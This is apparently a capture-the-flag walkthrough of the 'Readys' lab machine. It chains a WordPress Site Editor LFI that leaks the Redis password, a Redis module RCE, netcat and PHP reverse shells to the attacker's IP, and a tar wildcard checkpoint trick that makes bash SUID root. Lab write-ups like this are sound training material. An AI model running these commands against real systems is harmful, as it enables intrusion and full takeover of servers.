---
icon: ubuntu
---

# Readys - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.224.166 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-04 15:40 EDT
Nmap scan report for 192.168.224.166
Host is up (0.035s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Readys &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.38 (Debian)
|_http-generator: WordPress 5.7.2
6379/tcp open  redis   Redis key-value store
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   28.36 ms 192.168.45.1
2   28.38 ms 192.168.45.254
3   28.66 ms 192.168.251.1
4   28.83 ms 192.168.224.166
```

### <mark style="color:blue;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2375).png" alt=""><figcaption></figcaption></figure>

Since it is a wordpress sire, I am going to run a `wp-scan`

```
wpscan --url http://192.168.224.166/ --enumerate vp,u --api-token ************** --force
```

<figure><img src="../../.gitbook/assets/image (2377).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2376).png" alt=""><figcaption></figcaption></figure>

WpScan detected an LFI in site-editor version 1.1.1

### <mark style="color:$primary;">WP Plugin Site Editor 1.1.1 LFI</mark>

<figure><img src="../../.gitbook/assets/image (2378).png" alt=""><figcaption></figcaption></figure>

```
searchsploit -m 44340
```

There is a proof of concept inside

<figure><img src="../../.gitbook/assets/image (2379).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2380).png" alt=""><figcaption></figcaption></figure>

I am going to take a look at the web root directory&#x20;

```
/etc/apache2/sites-enabled/000-default.conf
```

<figure><img src="../../.gitbook/assets/image (2381).png" alt=""><figcaption></figcaption></figure>

Nothing else we can do Here

### <mark style="color:$primary;">REDIS Port 6379</mark>

<figure><img src="../../.gitbook/assets/image (2382).png" alt=""><figcaption></figcaption></figure>

No luck. I know there are a bunch of redis RCE exploits, but first we need to find some credentials. We already have an LFI so let's make use of it and look for redis.conf. I found a common [**location**](https://stackoverflow.com/questions/69365811/redis-debian-where-can-i-find-the-configuration-file) in this

```
/etc/redis/redis.conf
```

Since it returns a lot of information I will use curl

```
curl http://192.168.224.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/redis/redis.conf
```

<figure><img src="../../.gitbook/assets/image (2384).png" alt=""><figcaption></figcaption></figure>

I found the password in security part in the config file.&#x20;

I had to slowly read this its so easy to miss

### <mark style="color:$primary;">REDIS RCE</mark>

We are going to need two things to make this exploit to work the exploit itself found [**here**](https://github.com/Ridter/redis-rce) and a precompiled module <mark style="color:red;">**exp-lin.so**</mark> found [**here**](https://github.com/jas502n/Redis-RCE)

```
git clone https://github.com/jas502n/Redis-RCE.git
```

```
python3 redis-rce.py -r 192.168.224.166 -p 6379 -L 192.168.45.158 -P 443 -v -f ./exp_lin.so -a "Ready4Redis?"
```

<figure><img src="../../.gitbook/assets/image (2385).png" alt=""><figcaption></figcaption></figure>

Let's get a proper shell

```
busybox nc 192.168.45.158 80 -e /bin/bash
```

<figure><img src="../../.gitbook/assets/image (2386).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (2387).png" alt=""><figcaption></figcaption></figure>

Just like we saw earlier with the LFI 2 main users are alice and root

<figure><img src="../../.gitbook/assets/image (2388).png" alt=""><figcaption></figcaption></figure>

Checking `ps aux` we notice apache run by alice, if we can place a php reverse shell where the website is locate like `/var/www/html` we can get a shell as her

<figure><img src="../../.gitbook/assets/image (2389).png" alt=""><figcaption></figcaption></figure>

Unfortunately we do not have write permissions in that directory&#x20;

looking for writable directory

```
find / -type d -writable 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (2390).png" alt=""><figcaption></figcaption></figure>

Wait! We can still use the LFI to access it. We will place our reverse shell in the /tmp directory

Testing with phpinfo first

```
echo '<?php phpinfo(); ?>' > test.php
```

<figure><img src="../../.gitbook/assets/image (2391).png" alt=""><figcaption></figcaption></figure>

Let's see if we can access the it via the LFI

```
http://192.168.224.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/tmp/test.php
```

<figure><img src="../../.gitbook/assets/image (2392).png" alt=""><figcaption></figcaption></figure>

It fails let's try a different directory

<figure><img src="../../.gitbook/assets/image (2393).png" alt=""><figcaption></figcaption></figure>

```
http://192.168.224.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/run/redis/test.php
```

<figure><img src="../../.gitbook/assets/image (2394).png" alt=""><figcaption></figcaption></figure>

It works let's place a php reverse shell there. I'll use [https://www.revshells.com/](https://www.revshells.com/) to generate one and save it as reverse.php

<figure><img src="../../.gitbook/assets/image (2396).png" alt=""><figcaption></figcaption></figure>

Now let's get it to /run/redis and get a reverse shell as alice

<figure><img src="../../.gitbook/assets/image (2397).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2398).png" alt=""><figcaption></figcaption></figure>

```
http://192.168.224.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/run/redis/reverse.php
```

<figure><img src="../../.gitbook/assets/image (2399).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2400).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2401).png" alt=""><figcaption></figcaption></figure>

Checking the crontab we discover a script running as root every 3 minutes

<figure><img src="../../.gitbook/assets/image (2402).png" alt=""><figcaption></figcaption></figure>

it uses tar with a \* to backup /var/www/html directory

This is a great privesc method using tar wildcards

### <mark style="color:$primary;">Tar Wildcard Privesc</mark>

```
cd /var/www/html
echo "/bin/chmod 4755 /bin/bash" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

<figure><img src="../../.gitbook/assets/image (2403).png" alt=""><figcaption></figcaption></figure>

Now wait for the script to execute it and will have the SUID bit set on bash

<figure><img src="../../.gitbook/assets/image (2404).png" alt=""><figcaption></figcaption></figure>

And we are root!
